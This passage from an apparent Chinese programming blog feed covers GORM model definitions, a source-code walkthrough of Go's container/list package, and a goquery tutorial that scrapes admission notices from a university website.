<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> gorm</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Model base model definition, including fields `ID`, `CreatedAt`, `UpdatedAt`, `DeletedAt`, which could be embedded in your models</span></span><br><span class="line"><span class="comment">//    type User struct &#123;</span></span><br><span class="line"><span class="comment">//      gorm.Model</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="keyword">type</span> Model <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID        <span class="keyword">uint</span> <span class="string">`gorm:&quot;primary_key&quot;`</span></span><br><span class="line">	CreatedAt time.Time</span><br><span class="line">	UpdatedAt time.Time</span><br><span class="line">	DeletedAt *time.Time <span class="string">`sql:&quot;index&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实就是个ID，和时间的内嵌，挺好用的</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;database/sql&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jinzhu/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// User struct</span></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	gorm.Model</span><br><span class="line">	Name         <span class="keyword">string</span></span><br><span class="line">	Age          sql.NullInt64</span><br><span class="line">	Birthday     *time.Time</span><br><span class="line">	Email        <span class="keyword">string</span>  <span class="string">`gorm:&quot;type:varchar(100);unique_index&quot;`</span></span><br><span class="line">	Role         <span class="keyword">string</span>  <span class="string">`gorm:&quot;size:255;column:job&quot;`</span> <span class="comment">// 设置字段大小为255，修改列名</span></span><br><span class="line">	MemberNumber *<span class="keyword">string</span> <span class="string">`gorm:&quot;unique;not null&quot;`</span>     <span class="comment">// 设置会员号（member number）唯一并且不为空</span></span><br><span class="line">	Num          <span class="keyword">int</span>     <span class="string">`gorm:&quot;AUTO_INCREMENT&quot;`</span>      <span class="comment">// 设置 num 为自增类型</span></span><br><span class="line">	Address      <span class="keyword">string</span>  <span class="string">`gorm:&quot;index:addr&quot;`</span>          <span class="comment">// 给address字段创建名为addr的索引</span></span><br><span class="line">	IgnoreMe     <span class="keyword">int</span>     <span class="string">`gorm:&quot;-&quot;`</span>                   <span class="comment">// 忽略本字段</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 打开mysql中名为go_test的数据库</span></span><br><span class="line">	db, err := gorm.Open(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;root:xiaoyuyu@/go_test?charset=utf8&amp;parseTime=True&amp;loc=Local&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">&quot;failed to connect database&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> db.Close()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 自己用花里胡哨的办法生成一个杂七杂八的Model</span></span><br><span class="line">	<span class="comment">// 这次不用AutoMigrate，我的表名我做主</span></span><br><span class="line">	db.Table(<span class="string">&quot;workers&quot;</span>).CreateTable(&amp;User&#123;&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="注"><a href="#注" class="headerlink" title="注"></a>注</h3><p>基础的用得上的，基本就这些了吧，以后遇到了再记录</p>
]]></content>
      <tags>
        <tag>GO</tag>
      </tags>
  </entry>
  <entry>
    <title>Go_container/list</title>
    <url>/2020/04/08/Go-container-list/</url>
    <content><![CDATA[<p>看一下这个库的源代码</p>
<span id="more"></span>

<h3 id="结构分析"><a href="#结构分析" class="headerlink" title="结构分析"></a>结构分析</h3><h4 id="Element"><a href="#Element" class="headerlink" title="Element"></a>Element</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Element is an element of a linked list.</span></span><br><span class="line"><span class="keyword">type</span> Element <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">// Next and previous pointers in the doubly-linked list of elements.</span></span><br><span class="line">	<span class="comment">// To simplify the implementation, internally a list l is implemented</span></span><br><span class="line">	<span class="comment">// as a ring, such that &amp;l.root is both the next element of the last</span></span><br><span class="line">	<span class="comment">// list element (l.Back()) and the previous element of the first list</span></span><br><span class="line">	<span class="comment">// element (l.Front()).</span></span><br><span class="line">	next, prev *Element</span><br><span class="line"></span><br><span class="line">	<span class="comment">// The list to which this element belongs.</span></span><br><span class="line">	list *List</span><br><span class="line"></span><br><span class="line">	<span class="comment">// The value stored with this element.</span></span><br><span class="line">	Value <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="List"><a href="#List" class="headerlink" title="List"></a>List</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// List represents a doubly linked list.</span></span><br><span class="line"><span class="comment">// The zero value for List is an empty list ready to use.</span></span><br><span class="line"><span class="keyword">type</span> List <span class="keyword">struct</span> &#123;</span><br><span class="line">	root Element <span class="comment">// sentinel list element, only &amp;root, root.prev, and root.next are used</span></span><br><span class="line">	<span class="built_in">len</span>  <span class="keyword">int</span>     <span class="comment">// current list length excluding (this) sentinel element</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到List是一个双链表，它存在一个哨兵结点，姑且可以当作是一个头结点（不存放值），然后还包当前链表的长度（不包含头结点）</p>
<p>而头结点内部才包含前后指针，且还包含该结点所在链表的位置，以及自己本身的值</p>
<h3 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h3><p>一些方法的调用</p>
<h4 id="Init-amp-amp-New"><a href="#Init-amp-amp-New" class="headerlink" title="Init &amp;&amp; New"></a>Init &amp;&amp; New</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Init initializes or clears list l.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *List)</span> <span class="title">Init</span><span class="params">()</span> *<span class="title">List</span></span> &#123;</span><br><span class="line">	l.root.next = &amp;l.root</span><br><span class="line">	l.root.prev = &amp;l.root</span><br><span class="line">	l.<span class="built_in">len</span> = <span class="number">0</span></span><br><span class="line">	<span class="keyword">return</span> l</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// New returns an initialized list.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">()</span> *<span class="title">List</span></span> &#123; <span class="keyword">return</span> <span class="built_in">new</span>(List).Init() &#125;</span><br></pre></td></tr></table></figure>

<p>这两个就是i字面意思，没什么好说的，值得注意的就是Init还有清空的作用</p>
<h4 id="Len-amp-amp-Front-amp-amp-Back"><a href="#Len-amp-amp-Front-amp-amp-Back" class="headerlink" title="Len &amp;&amp; Front &amp;&amp; Back"></a>Len &amp;&amp; Front &amp;&amp; Back</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Len returns the number of elements of list l.</span></span><br><span class="line"><span class="comment">// The complexity is O(1).</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *List)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span> &#123; <span class="keyword">return</span> l.<span class="built_in">len</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Front returns the first element of list l or nil if the list is empty.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *List)</span> <span class="title">Front</span><span class="params">()</span> *<span class="title">Element</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> l.<span class="built_in">len</span> == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> l.root.next</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Back returns the last element of list l or nil if the list is empty.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *List)</span> <span class="title">Back</span><span class="params">()</span> *<span class="title">Element</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> l.<span class="built_in">len</span> == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> l.root.prev</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是字面意思，很清晰，这库真的香，需要注意的是只有List结点可以调用，普通的结点是不能调用的</p>
<h4 id="Next-amp-amp-Prev"><a href="#Next-amp-amp-Prev" class="headerlink" title="Next &amp;&amp; Prev"></a>Next &amp;&amp; Prev</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Next returns the next list element or nil.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *Element)</span> <span class="title">Next</span><span class="params">()</span> *<span class="title">Element</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> p := e.next; e.list != <span class="literal">nil</span> &amp;&amp; p != &amp;e.list.root &#123;</span><br><span class="line">		<span class="keyword">return</span> p</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Prev returns the previous list element or nil.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *Element)</span> <span class="title">Prev</span><span class="params">()</span> *<span class="title">Element</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> p := e.prev; e.list != <span class="literal">nil</span> &amp;&amp; p != &amp;e.list.root &#123;</span><br><span class="line">		<span class="keyword">return</span> p</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>普通节点调用的方法，返回前后结点，root结点值无法调用的</p>
<h4 id="Insert-node-amp-amp-value"><a href="#Insert-node-amp-amp-value" class="headerlink" title="Insert node &amp;&amp; value"></a>Insert node &amp;&amp; value</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// insert inserts e after at, increments l.len, and returns e.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *List)</span> <span class="title">insert</span><span class="params">(e, at *Element)</span> *<span class="title">Element</span></span> &#123;</span><br><span class="line">	n := at.next</span><br><span class="line">	at.next = e</span><br><span class="line">	e.prev = at</span><br><span class="line">	e.next = n</span><br><span class="line">	n.prev = e</span><br><span class="line">	e.list = l</span><br><span class="line">	l.<span class="built_in">len</span>++</span><br><span class="line">	<span class="keyword">return</span> e</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// insertValue is a convenience wrapper for insert(&amp;Element&#123;Value: v&#125;, at).</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *List)</span> <span class="title">insertValue</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;, at *Element)</span> *<span class="title">Element</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> l.insert(&amp;Element&#123;Value: v&#125;, at)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两种插入方式，第一种是插入节点，第二种是插入一个值（程序自动帮你转换成插入一个节点），插入在节点at之后</p>
<h4 id="两种Push"><a href="#两种Push" class="headerlink" title="两种Push"></a>两种Push</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PushFront inserts a new element e with value v at the front of list l and returns e.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *List)</span> <span class="title">PushFront</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;)</span> *<span class="title">Element</span></span> &#123;</span><br><span class="line">	l.lazyInit()</span><br><span class="line">	<span class="keyword">return</span> l.insertValue(v, &amp;l.root)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PushBack inserts a new element e with value v at the back of list l and returns e.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *List)</span> <span class="title">PushBack</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;)</span> *<span class="title">Element</span></span> &#123;</span><br><span class="line">	l.lazyInit()</span><br><span class="line">	<span class="keyword">return</span> l.insertValue(v, l.root.prev)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有点像帮我们实现了两端都可以输入的栈一样</p>
<h4 id="拼接链表"><a href="#拼接链表" class="headerlink" title="拼接链表"></a>拼接链表</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PushBackList inserts a copy of an other list at the back of list l.</span></span><br><span class="line"><span class="comment">// The lists l and other may be the same. They must not be nil.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *List)</span> <span class="title">PushBackList</span><span class="params">(other *List)</span></span> &#123;</span><br><span class="line">	l.lazyInit()</span><br><span class="line">	<span class="keyword">for</span> i, e := other.Len(), other.Front(); i &gt; <span class="number">0</span>; i, e = i<span class="number">-1</span>, e.Next() &#123;</span><br><span class="line">		l.insertValue(e.Value, l.root.prev)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PushFrontList inserts a copy of an other list at the front of list l.</span></span><br><span class="line"><span class="comment">// The lists l and other may be the same. They must not be nil.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *List)</span> <span class="title">PushFrontList</span><span class="params">(other *List)</span></span> &#123;</span><br><span class="line">	l.lazyInit()</span><br><span class="line">	<span class="keyword">for</span> i, e := other.Len(), other.Back(); i &gt; <span class="number">0</span>; i, e = i<span class="number">-1</span>, e.Prev() &#123;</span><br><span class="line">		l.insertValue(e.Value, &amp;l.root)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>其他还有不少方法也挺实用的，但是挺清晰的，也没什么大坑，要是有前文的了解，看起来很方便，整个库也就两百多行，以后遇到链表是个不错的偷懒选择</p>
]]></content>
      <tags>
        <tag>GO</tag>
      </tags>
  </entry>
  <entry>
    <title>Go_crawler</title>
    <url>/2020/03/26/Go-crawler/</url>
    <content><![CDATA[<p>借助goquery写个爬虫玩玩</p>
<span id="more"></span>

<h3 id="简述以及分析"><a href="#简述以及分析" class="headerlink" title="简述以及分析"></a>简述以及分析</h3><p>其实爬虫的思路都是一样的，从网上获取下来一个html静态网页，然后解析，过滤信息，找到自己想要的，或者找到绕过点，随之修改</p>
<p>在goquery中，每一个Document 代表一个将要被操作的 HTML 文档</p>
<p>有五种方法获取一个 Document 实例，分别是从一个 URL 创建、从一个 *html.Node 创建、从一个 io.Reader 创建、从一个 *http.Response 创建和从一个已有的 Document Clone 一个</p>
<p>我们从源码可以看出不管通过哪种函数实现哪种方法，返回值最后都是相同的，如下图</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> newDocument(root, <span class="literal">nil</span>), <span class="literal">nil</span></span><br></pre></td></tr></table></figure>

<p>其实就是返回一个newDocument的函数</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Private constructor, make sure all fields are correctly filled.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newDocument</span><span class="params">(root *html.Node, url *url.URL)</span> *<span class="title">Document</span></span> &#123;</span><br><span class="line">	<span class="comment">// Create and fill the document</span></span><br><span class="line">	d := &amp;Document&#123;<span class="literal">nil</span>, url, root&#125;</span><br><span class="line">	d.Selection = newSingleSelection(root, d)</span><br><span class="line">	<span class="keyword">return</span> d</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而这个函数返回一个document的指针</p>
<p>我们接下来分析一下document和函数中那个selection的结构与关系</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Selection represents a collection of nodes matching some criteria. The</span></span><br><span class="line"><span class="comment">// initial Selection can be created by using Document.Find, and then</span></span><br><span class="line"><span class="comment">// manipulated using the jQuery-like chainable syntax and methods.</span></span><br><span class="line"><span class="keyword">type</span> Selection <span class="keyword">struct</span> &#123;</span><br><span class="line">	Nodes    []*html.Node</span><br><span class="line">	document *Document</span><br><span class="line">	prevSel  *Selection</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注释里写的挺明显的了，用document.Find过滤出特定的一些结点集合，这个集合就是selection</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Document represents an HTML document to be manipulated. Unlike jQuery, which</span></span><br><span class="line"><span class="comment">// is loaded as part of a DOM document, and thus acts upon its containing</span></span><br><span class="line"><span class="comment">// document, GoQuery doesn&#x27;t know which HTML document to act upon. So it needs</span></span><br><span class="line"><span class="comment">// to be told, and that&#x27;s what the Document class is for. It holds the root</span></span><br><span class="line"><span class="comment">// document node to manipulate, and can make selections on this document.</span></span><br><span class="line"><span class="keyword">type</span> Document <span class="keyword">struct</span> &#123;</span><br><span class="line">	*Selection</span><br><span class="line">	Url      *url.URL</span><br><span class="line">	rootNode *html.Node</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个就不多做解释了，具体的Url，rootNode所含什么也可以在源码里面看到，需要了解了再看就好了</p>
<p>那么接下来按找步骤我们显然需要知道Document.Find这个函数怎么用，还是看源码</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Find gets the descendants of each element in the current set of matched</span></span><br><span class="line"><span class="comment">// elements, filtered by a selector. It returns a new Selection object</span></span><br><span class="line"><span class="comment">// containing these matched elements.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Selection)</span> <span class="title">Find</span><span class="params">(selector <span class="keyword">string</span>)</span> *<span class="title">Selection</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> pushStack(s, findWithMatcher(s.Nodes, compileMatcher(selector)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到本身document就包含一个selection，通过Find函数返回了一个新的selection，底下的具体函数没有在深入去看，感觉就是匹配的过程，毕竟有compile这个关键字</p>
<p>Find传入的这个参数是一个string类型</p>
<ol>
<li>doc.Find(“#temp”)    //根据id查找</li>
<li>doc.Find(“.temp”)     //根据class查找</li>
<li>doc.Find(“h1”).Find(“a”)   //链式调用，根据标签查找</li>
</ol>
<p>最常用的也就这几种了</p>
<p>然后找到了之后就肯定有很多节点嘛，因为我自己是完全不会jquery的，所以还是只能老老实实看源码了，要是会的大哥大姐们因该可以轻车熟路了</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Each iterates over a Selection object, executing a function for each</span></span><br><span class="line"><span class="comment">// matched element. It returns the current Selection object. The function</span></span><br><span class="line"><span class="comment">// f is called for each element in the selection with the index of the</span></span><br><span class="line"><span class="comment">// element in that selection starting at 0, and a *Selection that contains</span></span><br><span class="line"><span class="comment">// only that element.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Selection)</span> <span class="title">Each</span><span class="params">(f <span class="keyword">func</span>(<span class="keyword">int</span>, *Selection)</span>) *<span class="title">Selection</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i, n := <span class="keyword">range</span> s.Nodes &#123;</span><br><span class="line">		f(i, newSingleSelection(n, s.document))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>字面意思，没一个指针代表一个selection，对每一个合适的元素执行函数f，返回的同样是一个selection，统计的下表默认从0开始，也就是是说第一个符合要求的的在原先selection中的selection的下表是0</p>
<p>会把传入的selection中的所有selection全都循环一遍，要是符合要求就执行函数f，这个函数f的内容由我们自己定义，现在看起来比较抽象，仔细想一下还是好理解的，实在不行下面给了个例子</p>
<p>然后</p>
<p>然后要是找到自己想要的内容结点的情况下，像输出内容直接.Text()就可以输出了，返回的是string类型，看一下源码</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Text gets the combined text contents of each element in the set of matched</span></span><br><span class="line"><span class="comment">// elements, including their descendants.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Selection)</span> <span class="title">Text</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> buf bytes.Buffer</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Slightly optimized vs calling Each: no single selection object created</span></span><br><span class="line">	<span class="keyword">var</span> f <span class="function"><span class="keyword">func</span><span class="params">(*html.Node)</span></span></span><br><span class="line">	f = <span class="function"><span class="keyword">func</span><span class="params">(n *html.Node)</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> n.Type == html.TextNode &#123;</span><br><span class="line">			<span class="comment">// Keep newlines and spaces, like jQuery</span></span><br><span class="line">			buf.WriteString(n.Data)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> n.FirstChild != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">for</span> c := n.FirstChild; c != <span class="literal">nil</span>; c = c.NextSibling &#123;</span><br><span class="line">				f(c)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> _, n := <span class="keyword">range</span> s.Nodes &#123;</span><br><span class="line">		f(n)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> buf.String()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于 net/html 解析器要求文档必须是 UTF-8 编码，因此 goquery 库也有此要求。如果文档不是 UTF-8 编码，使用者需要自己转换</p>
<p>可以使用这个库：<a href="https://github.com/djimenez/iconv-go">github.com/djimenez/iconv-go</a></p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>华师大研究生招生信息网信息，因为他正好没用utf-8编码</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/PuerkitoBio/goquery&quot;</span></span><br><span class="line">	iconv <span class="string">&quot;github.com/djimenez/iconv-go&quot;</span> <span class="comment">// 给这个库一个别名iconv</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// connect</span></span><br><span class="line">	res, err := http.Get(<span class="string">&quot;https://yjszs.ecnu.edu.cn/&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;failed to connect&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">	<span class="comment">// check status</span></span><br><span class="line">	<span class="keyword">if</span> res.StatusCode != http.StatusOK &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;status code error&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// load HTML doc</span></span><br><span class="line">	<span class="comment">// 这里选择从一个 io.Reader 创建</span></span><br><span class="line">	doc, err := goquery.NewDocumentFromReader(res.Body)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;failed to load&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 得到了 Document 实例后，通过 Dcoument.Find 方法获取一个 Selection 实例</span></span><br><span class="line">	<span class="comment">// 基于home3list这个class进行查找，然后遍历输出</span></span><br><span class="line">	ansDoc := doc.Find(<span class="string">&quot;.home3list&quot;</span>) <span class="comment">// ansDoc 的类型是 *goquery.Selection</span></span><br><span class="line">	ansDoc.Each(<span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>, contentSelection *goquery.Selection)</span></span> &#123;</span><br><span class="line">		ans := contentSelection.Find(<span class="string">&quot;a&quot;</span>).Text()</span><br><span class="line">		<span class="comment">// 转换格式</span></span><br><span class="line">		ans, _ = iconv.ConvertString(ans, <span class="string">&quot;GB2312&quot;</span>, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">		fmt.Println(i+<span class="number">1</span>, <span class="string">&quot;: &quot;</span>, ans)</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	test()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输入结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 :  华东师范大学2020年硕士研究生招生考试初试自命题成</span><br><span class="line">2 :  华东师范大学关于2020年硕士研究生招生考试初试成绩</span><br><span class="line">3 :  华东师范大学2020年硕士研究生入学考试 艺术类考生</span><br><span class="line">4 :  2020年“少数民族高层次骨干人才计划”研究生报考注</span><br><span class="line">5 :  2020年“上海市教硕-规培相结合项目”招生简章</span><br><span class="line">6 :  关于开展2020年硕士研究生招生网上咨询的通知</span><br><span class="line">7 :  华东师范大学2020年硕士研究生招生专业目录</span><br><span class="line">8 :  华东师范大学2020年硕士研究生招生简章</span><br><span class="line">9 :  关于举办2020年研究生报考咨询活动的通知（校内场）</span><br><span class="line">10 :  关于2019年硕士研究生录取通知书寄发的通知</span><br><span class="line">11 :  华东师范大学2020年研究生招生宣传现场咨询会公告</span><br><span class="line">12 :  关于2019级新生户口迁移党团组织转接及录取通知书相</span><br><span class="line">13 :  2019年硕士研究生招生拟录取名单公示（不含推免生）</span><br><span class="line">14 :  关于举办2019年暑期全国优秀大学生夏令营活动的通知</span><br><span class="line">15 :  关于2019年硕士研究生拟录取后相关工作的通知</span><br><span class="line">16 :  2020年上海市硕士研究生招生考试报名费电子发票已可</span><br><span class="line">17 :  202001批次同等学力申硕课程考试准考证下载公告</span><br><span class="line">18 :  202001批次同等学力申硕课程考试报名通知</span><br><span class="line">19 :  2020年全国硕士研究生招生考试华东师范大学（311</span><br><span class="line">20 :  华东师范大学研究生招生考试违规违法行为举报电话</span><br><span class="line">21 :  华东师范大学考点2020年硕士研究生招生考试初试地点</span><br><span class="line">22 :  华东师范大学考点（3111）2020年硕士研究生招生</span><br><span class="line">23 :  201907批次同等学力申硕课程考试成绩公布公告</span><br><span class="line">24 :  华东师范大学报考点（报考点代码3111）2020年硕</span><br><span class="line">25 :  关于进一步严格规范硕士研究生招生考试培训行为的通知</span><br><span class="line">26 :  关于推迟2020年面向香港、澳门、台湾地区研究生招生</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">27 :  2020年面向港澳台地区招收研究生华东师范大学报考点</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">28 :  华东师范大学2020年面向香港、澳门、台湾地区招收研</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">29 :  华东师范大学2019年面向香港、澳门、台湾地区招收研</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">30 :  关于2020年公费师范毕业生攻读非全日制教育硕士推迟</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">31 :  华东师范大学2020年推荐免试攻读硕士学位研究生拟录</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">32 :  华东师范大学2020年推免生（含直博生）接收专业和人</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">33 :  我校各院系2020年推免生（含直博生）接收方案</span><br><span class="line"></span><br><span class="line">34 :  华东师范大学2020年推免生（含直博生）接收方案</span><br><span class="line"></span><br><span class="line">35 :  2020年公费师范毕业生攻读非全日制教育硕士招生简章</span><br><span class="line"></span><br><span class="line">36 :  2019年公费师范生申请攻读教育硕士专业学位拟录取名</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">37 :  关于申请2019年教育硕士的公费师范毕业生提交单位考</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">38 :  我校各院系2019年推免生（含直博生）接收方案</span><br><span class="line"></span><br><span class="line">39 :  2019年免费师范毕业生攻读非全日制教育硕士招生简章</span><br><span class="line"></span><br><span class="line">40 :  2019年推免生接收申请预报名的通知</span><br><span class="line"></span><br><span class="line">41 :  关于我校2020年博士研究生招生近期工作的公告</span><br><span class="line">42 :  华东师范大学2020年博士研究生招生“申请考核”专业</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line">43 :  华东师范大学2020年博士研究生招生“申请考核”报考</span><br><span class="line">                                                                        ...</span><br><span class="line"></span><br><span class="line">44 :  